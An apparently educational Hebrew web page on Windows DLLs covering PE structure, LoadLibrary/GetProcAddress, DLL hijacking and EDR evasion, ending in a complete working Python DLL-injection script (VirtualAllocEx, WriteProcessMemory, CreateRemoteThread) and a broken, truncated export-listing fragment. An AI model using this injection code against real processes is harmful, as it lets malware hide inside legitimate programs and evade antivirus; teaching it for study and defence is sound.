DLL — קוד משותף בין תהליכים

DLL = Dynamic Link Library. קובץ PE שמכיל פונקציות שניתן לשתף בין תהליכים. ה-DLL נטענת פעם אחת לזיכרון ו-mapped לכל process שצריך אותה.

💡 למה DLL ולא להכניס הכל ל-EXE?

חסכון זיכרון: kernel32.dll טעונה פעם אחת ב-RAM. 100 תהליכים חולקים אותה.
Update בלי קומפילציה: עדכן DLL — כל תוכניות שמשתמשות בה מקבלות שיפור.
Modularity: plugins, extensibility.

🔐 DLL ב-Cybersecurity

DLL Injection = הכנסת DLL זדונית לתהליך לגיטימי. Malware רץ תחת explorer.exe ועוקף AV. Hooking = יירוט API calls ע"י DLL זדונית.

📂 DLL Files בWindows

kernel32.dll — core Windows API
user32.dll — GUI, windows, input
ntdll.dll — NT native API
msvcrt.dll — C runtime
ws2_32.dll — Winsock (network)

מבנה DLL — PE Format

DLL = PE (Portable Executable) בדיוק כמו EXE. ההבדל: ה-Characteristics bit "DLL" מסומן ויש Export Table.

DOS Header (MZ) 0x0000 — 64 bytes
NT Headers (PE Signature + File Header) COFF / Portable Executable
Optional Header AddressOfEntryPoint · ImageBase · DataDirectories
📤 Export Directory (חשוב לDLL!) Function Names · Ordinals · RVA Addresses
📥 Import Directory Imported DLLs · IAT (Import Address Table)
.text (Code) Executable · PAGE_EXECUTE_READ
.data / .rdata Global Variables · Read-Only Data
.reloc (Base Relocations) Address Fix-ups

LoadLibrary & GetProcAddress

Implicit vs Explicit Loading

Implicit: מקשרים ב-compile time (lib file). DLL נטענת אוטומטית.
Explicit: LoadLibrary בזמן ריצה. גמיש יותר. Malware מעדיף — לא מופיע ב-Import Table! 

// C — טעינה דינמית של DLL
HMODULE hLib = LoadLibraryW(L"mylib.dll");
if (!hLib) {
    printf("Error: %d\n", GetLastError());
    return;
}

// קבל כתובת פונקציה
typedef int (*AddFunc)(int, int);
AddFunc myAdd = (AddFunc)GetProcAddress(
    hLib, "Add");

if (myAdd) {
    int result = myAdd(3, 4);
    printf("Result: %d\n", result);
}

FreeLibrary(hLib); // תמיד לשחרר!

🃏 DLL Loading APIs

LoadLibrary
טוען DLL לprocess. מחזיר HMODULE. DllMain נקרא עם DLL_PROCESS_ATTACH. kernel32.dll.
GetProcAddress
מחזיר כתובת של exported function לפי שם או ordinal. מחזיר FARPROC. נמצא ב-kernel32.
FreeLibrary
מוריד reference count של DLL. כשמגיע ל-0 — DllMain(DLL_PROCESS_DETACH) ו-unmap.
GetModuleHandle
מחזיר HMODULE של DLL שכבר טעונה — ללא טעינה מחדש. NULL = EXE הנוכחי.
DllMain
Entry point של DLL. נקרא ב-ATTACH/DETACH של process ו-thread. לא לעשות כאן כמעט כלום!
dumpbin /exports
MSVC tool — מראה כל exported function מ-DLL. שם, ordinal, כתובת RVA.
DLL Hijacking
הכנסת DLL זדונית בתיקיית EXE לפני DLL לגיטימית. Windows מחפש שם ראשון → malware נטען!
🔐 Cyber
EDR מנטרת LoadLibrary + GetProcAddress. Malware מתקדם קורא ntdll ישירות כדי לחמוק!

DLL Injection — Python Implementation

⚠️ לחינוכי בלבד! שימוש על מחשב עצמי בלבד.

"""dll_inject.py — DLL Injection Demo
   Educational purposes ONLY
   Run as Administrator on your own VM
"""
import ctypes, ctypes.wintypes as wt, sys

k32 = ctypes.windll.kernel32

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT         = 0x1000
MEM_RESERVE        = 0x2000
PAGE_READWRITE     = 0x04

def inject_dll(pid: int, dll_path: str) -> bool:
    print(f"[*] Target PID: {pid}")
    print(f"[*] DLL Path:   {dll_path}")

    # שלב 1: פתח handle לתהליך
    hProc = k32.OpenProcess(
        PROCESS_ALL_ACCESS, False, pid)
    if not hProc:
        print(f"[-] OpenProcess failed: {k32.GetLastError()}")
        return False
    print(f"[+] Got process handle: {hProc:#x}")

    # שלב 2: הקצה זיכרון בתהליך היעד
    dll_bytes = (dll_path + '\0').encode('utf-16-le')
    pMem = k32.VirtualAllocEx(
        hProc, None,
        len(dll_bytes),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE)
    if not pMem:
        print(f"[-] VirtualAllocEx failed")
        k32.CloseHandle(hProc)
        return False
    print(f"[+] Allocated memory at: {pMem:#x}")

    # שלב 3: כתוב DLL path לזיכרון
    written = wt.DWORD()
    k32.WriteProcessMemory(
        hProc, pMem,
        dll_bytes, len(dll_bytes),
        ctypes.byref(written))
    print(f"[+] Wrote {written.value} bytes")

    # שלב 4: CreateRemoteThread → LoadLibraryW
    load_lib = k32.GetProcAddress(
        k32.GetModuleHandleW("kernel32"),
        b"LoadLibraryW")
    print(f"[+] LoadLibraryW at: {load_lib:#x}")

    hThread = k32.CreateRemoteThread(
        hProc, None, 0,
        load_lib, pMem,
        0, None)
    if not hThread:
        print(f"[-] CreateRemoteThread failed!")
        return False

    print(f"[+] Injection thread: {hThread:#x}")
    k32.WaitForSingleObject(hThread, 5000)
    k32.CloseHandle(hThread)
    k32.CloseHandle(hProc)
    print("[✓] DLL Injected!")
    return True

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: inject.py <PID> <DLL_PATH>")
        sys.exit(1)
    inject_dll(int(sys.argv[1]), sys.argv[2])

def list_dll_exports(dll_path: str):

        status = "✓" if addr else "✗"
        print(f"  {status} {name}: {hex(addr) if addr else 'N/A'}")
